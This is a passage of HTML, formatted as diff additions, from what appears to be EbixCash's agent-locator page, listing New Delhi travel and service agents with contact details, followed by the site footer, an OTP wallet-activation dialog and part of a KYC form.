+                      <p><strong>Address: </strong>1/1 BHAGAT SINGH LANE GOL MKT., NEW DELHIDELHI </p>
+                      <p><strong>City: </strong>Delhi</p>
+                      <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq2"> <a href="#collapse2" class="" data-bs-toggle="collapse" data-target="#collapse2" aria-expanded="false" aria-controls="collapse2">
+                    <h6 class="mb-0"><span></span>BHATIA BROTHERS NEW DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse2" class="collapse" aria-labelledby="faq2" data-parent="#accordion2">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Surender Bhatia</p>
+                    
+                    <p><strong>Contact: </strong>9891234757</p>
+                    
+                    <p><strong>Email: </strong>singhsimran86@yahoo.co.in</p>
+                    <p><strong>Address: </strong>C.P, DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq3"> <a href="#collapse3" class="" data-bs-toggle="collapse" data-target="#collapse3" aria-expanded="false" aria-controls="collapse3">
+                    <h6 class="mb-0"><span></span>KUNAL TOURS AND TRAVELS DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse3" class="collapse" aria-labelledby="faq3" data-parent="#accordion3">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Shiv Narayan Gupta</p>
+                    
+                    <p><strong>Contact: </strong>9212011010</p>
+                    
+                    <p><strong>Email: </strong>KUNALTOURTRAVEL@GMAIL.COM</p>
+                    <p><strong>Address: </strong>TILAK BRIDGE, DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq4"> <a href="#collapse4" class="" data-bs-toggle="collapse" data-target="#collapse4" aria-expanded="false" aria-controls="collapse4">
+                    <h6 class="mb-0"><span></span>TRAIL BLAZER VACATIONS PVT LTD CANNAUGHT PLA IBP</h6>
+                  </a> </div>
+                <div id="collapse4" class="collapse" aria-labelledby="faq4" data-parent="#accordion4">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Pankaj Tyagi</p>
+                    
+                    <p><strong>Contact: </strong>9899696013</p>
+                    
+                    <p><strong>Email: </strong>trailblazervacations@gmail.com</p>
+                    <p><strong>Address: </strong>Delhi, Delhi </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq5"> <a href="#collapse5" class="" data-bs-toggle="collapse" data-target="#collapse5" aria-expanded="false" aria-controls="collapse5">
+                    <h6 class="mb-0"><span></span>CAFE INTERNET DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse5" class="collapse" aria-labelledby="faq5" data-parent="#accordion5">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Shammi Kumar Sharma</p>
+                    
+                    <p><strong>Contact: </strong>8800330339</p>
+                    
+                    <p><strong>Email: </strong>shammi.sharma@gmail.com</p>
+                    <p><strong>Address: </strong>BHAGAT SINGH MARKET, NEW DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq6"> <a href="#collapse6" class="" data-bs-toggle="collapse" data-target="#collapse6" aria-expanded="false" aria-controls="collapse6">
+                    <h6 class="mb-0"><span></span>SHIVAM ENTERPRISES DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse6" class="collapse" aria-labelledby="faq6" data-parent="#accordion6">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Dhirendra K</p>
+                    
+                    <p><strong>Contact: </strong>9716094646</p>
+                    
+                    <p><strong>Email: </strong>shivamenterprises0001@rediffmail.com</p>
+                    <p><strong>Address: </strong>BARAKHANBA ROAD, NEW DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq7"> <a href="#collapse7" class="" data-bs-toggle="collapse" data-target="#collapse7" aria-expanded="false" aria-controls="collapse7">
+                    <h6 class="mb-0"><span></span>SHRI WORLD TRAVELS DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse7" class="collapse" aria-labelledby="faq7" data-parent="#accordion7">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Vinod Kumar</p>
+                    
+                    <p><strong>Contact: </strong>9810849476</p>
+                    
+                    <p><strong>Email: </strong>swtrayels@yahoo.com</p>
+                    <p><strong>Address: </strong>CONNAUGHT PLACE, NEW DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq8"> <a href="#collapse8" class="" data-bs-toggle="collapse" data-target="#collapse8" aria-expanded="false" aria-controls="collapse8">
+                    <h6 class="mb-0"><span></span>DSD TRAVELS AND TOURS JANPATH IBP</h6>
+                  </a> </div>
+                <div id="collapse8" class="collapse" aria-labelledby="faq8" data-parent="#accordion8">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Vijaykumar Gupta</p>
+                    
+                    <p><strong>Contact: </strong>9811018426</p>
+                    
+                    <p><strong>Email: </strong>dsdtravels@airtelmail.com</p>
+                    <p><strong>Address: </strong>Delhi, Delhi </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq9"> <a href="#collapse9" class="" data-bs-toggle="collapse" data-target="#collapse9" aria-expanded="false" aria-controls="collapse9">
+                    <h6 class="mb-0"><span></span>V K  ELECTROSTAT</h6>
+                  </a> </div>
+                <div id="collapse9" class="collapse" aria-labelledby="faq9" data-parent="#accordion9">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Vineet Gupta</p>
+                    
+                    <p><strong>Contact: </strong>9818370457</p>
+                    
+                    <p><strong>Email: </strong>vineet53231966@gmail.com</p>
+                    <p><strong>Address: </strong>Shop No.9, Udayn Marg, Udayn Marg, Udayn Marg </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq10"> <a href="#collapse10" class="" data-bs-toggle="collapse" data-target="#collapse10" aria-expanded="false" aria-controls="collapse10">
+                    <h6 class="mb-0"><span></span>UNIQUE COMMERCIAL SERVICES DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse10" class="collapse" aria-labelledby="faq10" data-parent="#accordion10">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Baldev Baldev Raj Chugh</p>
+                    
+                    <p><strong>Contact: </strong>9811025140</p>
+                    
+                    <p><strong>Email: </strong>chug_br@hotmail.com</p>
+                    <p><strong>Address: </strong>PALIKA BAZAR, DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq11"> <a href="#collapse11" class="" data-bs-toggle="collapse" data-target="#collapse11" aria-expanded="false" aria-controls="collapse11">
+                    <h6 class="mb-0"><span></span>LAKSHMI BOOK STORE NEW DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse11" class="collapse" aria-labelledby="faq11" data-parent="#accordion11">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Mohinder Mohinder Kumar Sagar</p>
+                    
+                    <p><strong>Contact: </strong>9810558554</p>
+                    
+                    <p><strong>Email: </strong>18LAKSHMIBOOKSTORE@GMAIL.COM</p>
+                    <p><strong>Address: </strong>Janpath, New Delhi </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq12"> <a href="#collapse12" class="" data-bs-toggle="collapse" data-target="#collapse12" aria-expanded="false" aria-controls="collapse12">
+                    <h6 class="mb-0"><span></span>JANTA TRADING CO NEW DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse12" class="collapse" aria-labelledby="faq12" data-parent="#accordion12">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Sangeeta Devi</p>
+                    
+                    <p><strong>Contact: </strong>9968330341</p>
+                    
+                    <p><strong>Email: </strong>iamaksinght@gmail.com</p>
+                    <p><strong>Address: </strong>GOLE MARKET, NEW DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq13"> <a href="#collapse13" class="" data-bs-toggle="collapse" data-target="#collapse13" aria-expanded="false" aria-controls="collapse13">
+                    <h6 class="mb-0"><span></span>IRCTC TESTING NEW DELHI IBP</h6>
+                  </a> </div>
+                <div id="collapse13" class="collapse" aria-labelledby="faq13" data-parent="#accordion13">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Irctc Irctc</p>
+                    
+                    <p><strong>Contact: </strong>23365683</p>
+                    
+                    <p><strong>Email: </strong>wsoperations@irctc.co.in</p>
+                    <p><strong>Address: </strong>Cannaught Place, New Delhi, New Delhi, New Delhi </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq14"> <a href="#collapse14" class="" data-bs-toggle="collapse" data-target="#collapse14" aria-expanded="false" aria-controls="collapse14">
+                    <h6 class="mb-0"><span></span>LAKSHMI BOOK STORE</h6>
+                  </a> </div>
+                <div id="collapse14" class="collapse" aria-labelledby="faq14" data-parent="#accordion14">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Ashim Sagar</p>
+                    
+                    <p><strong>Contact: </strong>9811777815</p>
+                    
+                    <p><strong>Email: </strong>travelbuzz18lbs@gmail.com</p>
+                    <p><strong>Address: </strong>18 Indian Oil, Bhawan, Janpath, Janpath </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq15"> <a href="#collapse15" class="" data-bs-toggle="collapse" data-target="#collapse15" aria-expanded="false" aria-controls="collapse15">
+                    <h6 class="mb-0"><span></span>KHALSA TOURS AND TRAVELS</h6>
+                  </a> </div>
+                <div id="collapse15" class="collapse" aria-labelledby="faq15" data-parent="#accordion15">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Singh Pushpinder</p>
+                    
+                    <p><strong>Contact: </strong>9811313007</p>
+                    
+                    <p><strong>Email: </strong>mickytul@gmail.com</p>
+                    <p><strong>Address: </strong>MB 03 BLOCK A NARURANG HOUSE KG MAR, C P NEW DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq16"> <a href="#collapse16" class="" data-bs-toggle="collapse" data-target="#collapse16" aria-expanded="false" aria-controls="collapse16">
+                    <h6 class="mb-0"><span></span>ANKIT MANGAL1</h6>
+                  </a> </div>
+                <div id="collapse16" class="collapse" aria-labelledby="faq16" data-parent="#accordion16">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Mangal Ankit</p>
+                    
+                    <p><strong>Contact: </strong>9509123456</p>
+                    
+                    <p><strong>Email: </strong>aryaliferocks@gmail.com</p>
+                    <p><strong>Address: </strong>67 24 BABU MOHALLA, KESAR GANJ </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq17"> <a href="#collapse17" class="" data-bs-toggle="collapse" data-target="#collapse17" aria-expanded="false" aria-controls="collapse17">
+                    <h6 class="mb-0"><span></span>TPB TRIP PLANNERINDIA PRIVATE LIMIT</h6>
+                  </a> </div>
+                <div id="collapse17" class="collapse" aria-labelledby="faq17" data-parent="#accordion17">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Mishra Pawan</p>
+                    
+                    <p><strong>Contact: </strong>9811722210</p>
+                    
+                    <p><strong>Email: </strong>tpb@travelpathbureau.com</p>
+                    <p><strong>Address: </strong>1604 16TH FLOOR NIRMAL TOWER 26, BARAKHAMBA ROAD CONNAUGHT PLACE </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+              
+              <div class="card border-bottom mb-3 rounded">
+                <div class="card-header border-bottom-0 bg-white p-0" id="faq18"> <a href="#collapse18" class="" data-bs-toggle="collapse" data-target="#collapse18" aria-expanded="false" aria-controls="collapse18">
+                    <h6 class="mb-0"><span></span>PRADEEP KUMAR</h6>
+                  </a> </div>
+                <div id="collapse18" class="collapse" aria-labelledby="faq18" data-parent="#accordion18">
+                  <div class="card-body line-height23 pt-0 pb-2">
+                    <p><strong>Agent Name: </strong>Kumar Pradeep</p>
+                    
+                    <p><strong>Contact: </strong>9871023290</p>
+                    
+                    <p><strong>Email: </strong>pradeepkumar24311@gmail.com</p>
+                    <p><strong>Address: </strong>P 28 GALI NO 1 PHASE 4 MAIN ROAD, GAUTAM VIHAR SHIV VIHAR DELHI </p>
+                    <p><strong>City: </strong>Delhi</p>
+                    <p><strong>Pincode: </strong>110001</p>
+                  </div>
+                </div>
+              </div>
+              
+            
+          </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- footer start here -->
+  
+<div class="back-to-top">
+  <a href="#" class="sscroll">
+    <i class="ei-long-arrow-right"></i>
+  </a>
+</div>
+
+<footer class="border-top py-4 bg-electric-voilet">
+  <div class="container">
+    <div class="row">
+      <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 d-none d-md-block">
+        <h4>Discover EbixCash</h4>
+        <ul>
+          <li><a href="/discover-ebixcash/">Introduction</a></li>
+          <li><a href="/discover-ebixcash/market-overview/">Market Overview</a></li>
+          <li><a href="/discover-ebixcash/our-strength/">Our Strength</a></li>
+          <li><a href="/discover-ebixcash/global-offices/">Global Offices</a></li>
+          <li><a href="/discover-ebixcash/leadership/">Leadership</a></li>
+        </ul>
+      </div>
+
+      <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 d-none d-md-block">
+
+        <h4>Investors</h4>
+        <ul>
+          <li><a href="/investor-relation/">Investor Home</a></li>
+          <li><a href="/investor-relation/key-financial-data/">Key Financial Data</a></li>
+          <li><a href="/investor-relation/quarterly-results/">Quarterly Results</a></li>
+          <li><a href="/investor-relation/regulatory-fillings/">Announcement</a></li>
+          <li><a href="/investor-relation/corporate-governance/">Corporate Governance</a></li>
+          <li><a href="/investor-relation/leadership-investor/">Leadership</a></li>
+          <li><a href="/investor-relation/investor-contact/">Contact Information</a></li>
+        </ul>
+      </div>
+
+      <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 d-none d-md-block">
+        <h4>EbixCash for Consumer</h4>
+        <ul>
+          <li><a href="/ebixcash-consumer/flight/">Flights</a></li>
+          <li><a href="/ebixcash-consumer/hotel/">Hotels</a></li>
+          <li><a href="/ebixcash-consumer/holiday/">Holidays</a></li>
+          <li><a href="https://ebixcash.com/cabs" target="_blank">Cabs</a></li>
+          <li><a href="/ebixcash-consumer/bus/">Buses</a></li>
+          <!--<li><a href="https://in.via.com/bdo?action1=RAIL_TICKETS" target="_blank">Trains</a></li>  -->
+          <li><a href="/ebixcash-consumer/forex/">Forex</a></li>
+          <li><a href="/ebixcash-consumer/money-transfer/">Money Transfer</a></li>
+          <li><a href="/ebixcash-consumer/prepaid-card/">Prepaid & Gift Cards</a></li>
+          <li><a href="/ebixcash-consumer/billpayment/">Bill Payment & Recharges</a></li>
+        </ul>
+      </div>
+      <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 d-none d-md-block">
+        <h4>EbixCash for Business</h4>
+        <ul>
+          <li><a href="/ebixcash-business/payment-solution/">Payment Solutions</a></li>
+          <li><a href="/ebixcash-business/travel-services/">Travel Services</a></li>
+          <li><a href="/ebixcash-business/financial-technology/">Financial Technology</a></li>
+          <li><a href="/ebixcash-business/travel-technology/">Travel Technology</a></li>
+          <li><a href="/ebixcash-business/bus-exchange-solutions/">Bus Exchange Solution</a></li>
+          <li><a href="/ebixcash-business/telecom-services/">Telecom Services</a></li>
+          <li><a href="/ebixcash-business/data-services/">Data Services</a></li>
+          <li><a href="/ebixcash-business/bpo-services/">BPO Services</a></li>
+          <li><a href="/ebixcash-business/e-learning/">E-Learning</a></li>
+          <li><a href="/ebixcash-business/logistic-services/">Logistic Services</a></li>
+          <li><a href="/ebixcash-business/insurance-services/">Insurance Services</a></li>
+          <li><a href="/ebixcash-business/agent-assisted-model/">Agent Assisted Mode</a></li>
+          <li><a href="/ebixcash-business/ebixcash-cab-services/">EbixCash Cabs</a></li>
+        </ul>
+      </div>
+      <div class="col-xl-2 col-lg-4">
+        <h4>Ebixcash (PPI)</h4>
+        <ul>
+          <li><a href="/discover-ebixcash/">About Us</a></li>
+          <li><a href="/legal-documents/">Legal Documents</a></li>
+          <li><a href="/faqs/">FAQs</a></li>
+          <li><a href="/terms/">Terms & Conditions</a></li>
+          <li><a href="/privacy/">Privacy Policy</a></li>
+          <li><a href="/code-of-conduct/">Code of Conduct</a></li>
+          <li><a href="/contact-us/">Contact Us</a></li>
+          <li><a href="/complaint-status/">Complaint Status</a></li>
+          <!--
+          <li><a href="/nodal-officers/">Nodal Officers</a></li>
+          -->
+          <li><a href="/all-news/">Media & News</a></li>
+          <li><a href="/static/Common/pdf/act/PSS_ACT_AMMENDMENT_2007N2015.pdf" target="_blank">Acts</a></li>
+          <li><a href="/find-our-agents/">Find Our Agents</a></li>
+
+
+
+        </ul>
+      </div>
+      <div class="col-xl-2 col-lg-4">
+        <div class="social">
+          <h4>Connect & share</h4>
+          <a href="https://www.facebook.com/EbixCash" target="_blank" class="fb"><i
+              class="fab fa-facebook-square"></i></a>
+          <a href="https://twitter.com/EbixCash" target="_blank" class="tw"><i class="fab fa-twitter-square"></i></a>
+          <a href="https://www.instagram.com/EbixCash/" target="_blank" class="ins"><i class="fab fa-instagram"></i></a>
+          <a href="https://www.linkedin.com/company/ebixcash-pvtltd/" target="_blank" class="in"><i
+              class="fab fa-linkedin-square"></i></a>
+          <!-- <a href="https://aboutme.google.com/u/0/?referer=gplus" target="_blank" class="gp"><i class="fab fa-google-plus-g"></i></a>  -->
+        </div>
+        <div class="download mb-4">
+          <h4>Download app for compatible devices</h4>
+          <a href="https://play.google.com/store/apps/details?id=app.ebixcash&hl=en" target="_blank"
+            class="mb-1 d-block"><img src="/static/Common/img/icons/playstore.jpg" class="img-fluid"
+              alt="Play Store"></a>
+          <a href="https://apps.apple.com/in/app/ebix-cash/id1394480281" target="_blank"><img
+              src="/static/Common/img/icons/appstore.jpg" class="img-fluid" alt="App store"></a>
+
+          <a href="https://invite.taxbuddy.com/X9EWA61?compid=DISCOUNT10" target="_blank"><img
+              src="/static/Common/img/taxlogo.png" style="margin-top:10px; border-radius:5px;;" width="135"
+              class="img-fluid" alt="App store"></a>
+        </div>
+        <!-- <div class="ebixcash-address line-height23 text-white">
+            <strong>EbixCash Limited</strong> <br>
+            <strong>CIN number :</strong> U72900DL2002PLC392081 <br>
+            <strong>Registered Office:</strong> 101, FIRST FLOOR, 4832/24, ANSARI ROAD, DARYA GANJ, NEW DELHI CENTRAL DELHI DL 110002 IN<br>
+            <strong>Corporate Office:</strong> PLOT NO 122 & 123 NSEZ PHASE II NOIDA 201305 UP IN
+            
+        </div> -->
+      </div>
+    </div>
+  </div>
+</footer>
+<div class="footerbottom mt-0">
+  <p>© 2025 All rights reserved</p>
+</div>
+
+
+<div class="modal fade" id="applicationpopup" tabindex="-1" role="dialog" aria-labelledby="applicationpopupLabel"
+  aria-hidden="true">
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+
+      <div class="modal-header">
+
+        <h5 class="modal-title text-center">Alert!</h5>
+
+      </div>
+      <div class="modal-body">
+        <p class="text-center" style="line-height: normal;">Your wallet is INACTIVE. To ACTIVATE your wallet click on
+          the button below and verify your mobile number via OTP</p>
+        <span id="inactive_sendotp_error" class="text-danger"></span>
+
+        <div class="w-100 text-center">
+          <button type="button" id="inactive_send_otp_btn" class="btn btn-primary">Send OTP</button>
+          <button type="button" id="inactive_send_otp_close" class="btn btn-primary"
+            onclick="$('#applicationpopup').modal('hide');">Cancel</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="modal fade" id="inactive_otp_verify" tabindex="-1" role="dialog" aria-labelledby="inactive_otp_verify"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <div style="margin:0 auto;">
+          <h5 class="modal-title text-center">OTP Verification</h5>
+          <p class="text-center" style="color: #f2224e; margin-bottom: 0;">(Wallet Activation)</p>
+        </div>
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center">
+          <div class="col-md-11">
+            <form method="POST" id='inactive_otp_form'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div class="form-group">
+                <span id="inactive_readotp_msg" class="text-success"></span>
+                <span id="inactive_readotp_error" class="text-danger"></span>
+
+                <input type="text" class="form-control" id="login_user_mob_f" value=""
+                  name="login_user_mob_f" required disabled>
+              </div>
+              <div class="form-group">
+                <div class="input-group mb-2">
+                  <input type="password" class="form-control togglewallet" id="inactive_otp" name='inactive_otp'
+                    placeholder="Enter Mobile OTP" name="Wmobileotp_verify" maxlength="6" minlength="6"
+                    onkeypress='return restrictAlphabets(event)' required>
+                  <div class="input-group-prepend">
+                    <div class="input-group-text"><i class="fas fa-eye-slash toggle-password-Walletmobileotp"></i>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- <div class="form-group">
+
+            <p class="text-right mb-2"><a id="walletmobotp_verify" class="resendotpc" onclick="walletuser_resendotp()">Resend OTP</a></p>
+            <p id="displaysignupwallet"></p>
+          
+        </div> -->
+
+              <div class="form-group">
+                <p id="resendbtn"></p>
+                <button type="button" id="Verifyinactiveotpbtn"
+                  class="custmbtn btn btn-primary btn-block">Verify</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- Verify your kyc Details -->
+<div class="modal fade ebixcashStudio" id="PerInfo" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
+  role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center">Personal Information</h5>
+
+
+        <!--<button type="button" class="close" id="signupclose" data-ds-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button> -->
+
+      </div>
+
+      <div class="modal-body ">
+
+        <form method="POST" id="updateprofileform">
+          <div class="row">
+
+
+            <div class="col-md-4 col-sm-6 mb-4">
+              <div class="form-group">
+                <label for="">Annual Income</label>
+                <select class="form-control form-select" name="annual_income" id="annual_income">
+                  <option value="">Select an Option</option>
+
+                  <option value="0 – 2.5 Lacs">0 – 2.5 Lacs</option>
+
+                  <option value="2.5 – 5 Lacs">2.5 – 5 Lacs</option>
+
+                  <option value="5 – 10 Lacs">5 – 10 Lacs</option>
+
+                  <option value="Greater than 10 lacs">Greater than 10 lacs</option>
+
+                </select>
+              </div>
+
+            </div>
+
+
+
+            <!--  <div class="col-md-4 col-sm-6 d-none d-lg-block"></div> -->
+
+
+            <div class="col-md-4 col-sm-6 mb-4">
+              <div class="form-group">
+                <label for="">Marital Status</label>
+                <select class="form-control form-select" name="marital_status" id="marital_status">
+                  <option value="">Select an Option</option>
+
+                  <option value="Unmarried">Unmarried</option>
+
+                  <option value="Married">Married</option>
+
+                  <option value="Others">Others</option>
+
+                </select>
+              </div>
+
+            </div>
+
+            <div class="col-md-4 col-sm-6 mb-4">
+              <div class="form-group">
+                <label for=""> Occupation</label>
+                <select class="form-control form-select" name="occupation" id="occupation">
+                  <option value="">Select an Option</option>
+
+                  <option value="Salaried"> Salaried</option>
+
+                  <option value="Self Employed"> Self Employed</option>
+
+                  <option value="Own Business">Own Business</option>
+
+                  <!-- <option value="Others2">Others</option> -->
+                </select>
+              </div>
+
+            </div>
+
+            <div class="row" id="optional_occupation_wrapper" hidden>
+              <div class="col-md-4 col-sm-6 mb-3">
+                <div class="form-group">
+                  <label for="">Optional Occupation</label>
+                  <input type="text" name="optional_occupation" id="optional_occupation" class="form-control"
+                    placeholder="Enter Optional Occupation...">
+                </div>
+              </div>
+            </div>
+
+
+
+
+
+            <div class="col-md-6 col-sm-12 mb-4">
+              <div class="form-group">
+                <div class="row">
+                  <label class="col-md-12">Are you Physically disabled person?</label>
+                  <div class="col-md-12">
+                    <div class="form-check form-check-inline ps-0">
+                      <input class="form-check-input" type="radio" id="physically_disabled" value="false"
+                        name="physically_disabled" checked>
+                      <span style="top:3px;"></span>
+                      <label class="form-check-label" for="phno">No</label>
+                    </div>
+                    <div class="form-check form-check-inline ps-0">
+                      <input class="form-check-input" type="radio" value="true" name="physically_disabled">
+                      <span style="top:3px;"></span>
+                      <label class="form-check-label" for="phyes">Yes</label>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-md-6 col-sm-12 mb-4">
+              <div class="form-group">
+                <div class="row">
+                  <label class="col-md-12">Are you a PEP(Politically Exposed Person)?</label>
+                  <div class="col-md-12">
+                    <div class="form-check form-check-inline ps-0">
+                      <input class="form-check-input" type="radio" id="pepno" value="false"
+                        name="politically_exposed" value="false" checked>
+                      <span style="top:3px;"></span>
+                      <label class="form-check-label" for="phno">No</label>
+                    </div>
+                    <div class="form-check form-check-inline ps-0">
+                      <input class="form-check-input" type="radio" value="true" name="politically_exposed" id="pepyes">
+                      <span style="top:3px;"></span>
+                      <label class="form-check-label" for="pepyes">Yes</label>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-12 mb-4" id="phForm" style="display:none; margin-top: -20px;">
+              <div class="row">
+                <div class="col-md-4 col-sm-6 mb-3">
+                  <div class="form-group">
+                    <label for="">Enter PEP Details</label>
+                    <input type="text" pattern="[a-zA-Z]+( [a-zA-Z]+)*" name="pep_name" id="pep_name" maxlength="50" class="form-control"
+                      placeholder="Enter PEP Details...">
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-md-6 col-sm-12 mb-4">
+              <div class="form-group">
+                <div class="row">
+                  <label class="col-md-12">Do you want to add a nominee now?</label>
+                  <div class="col-md-12">
+                    <div class="form-check form-check-inline ps-0">
+                      <input class="form-check-input" type="radio" id="nomineeno" name="add_a_nominee" checked
+                        value="false">
+                      <span style="top:3px;"></span>
+                      <label class="form-check-label" for="nomineeno">No</label>
+                    </div>
+                    <div class="form-check form-check-inline ps-0">
+                      <input class="form-check-input" type="radio" name="add_a_nominee" id="nomineeyes" value="true">
+                      <span style="top:3px;"></span>
+                      <label class="form-check-label" for="nomineeyes">Yes</label>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-md-12 mb-4" id="nomineeForm" style="display:none; margin-top: -20px;">
+
+              <div class="row">
+                <div class="col-md-4 col-sm-6 mb-3">
+                  <div class="form-group">
+                    <label for="">Nominee Name</label>
+                    <input type="text" pattern="[a-zA-Z]+( [a-zA-Z]+)*" name="nominee_name" class="form-control"
